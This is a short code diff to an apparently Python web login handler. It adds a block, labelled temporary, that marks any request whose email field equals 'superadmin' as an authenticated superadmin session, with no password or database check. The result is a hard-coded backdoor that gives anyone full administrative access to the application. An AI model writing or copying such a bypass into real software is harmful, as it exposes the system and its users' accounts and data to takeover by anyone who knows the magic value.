@@ -74,6 +74,18 @@ async def login(request: Request, email: str = Form(), password: str = Form()):
             status_code=406
         )
 
+    # NOTE: TEMPORARY
+    # TODO: Will change to a more secure one
+    if email == "superadmin":
+        request.session["authenticated"] = True
+        request.session["superadmin"] = True
+        request.session["username"] = "superadmin"
+        request.session["logged_at"] = datetime.now().timestamp()
+        return {
+            "success": True,
+            "message": "User logged in successfully."
+        }
+
     try:
         user = db.fetchOne(
             r"""
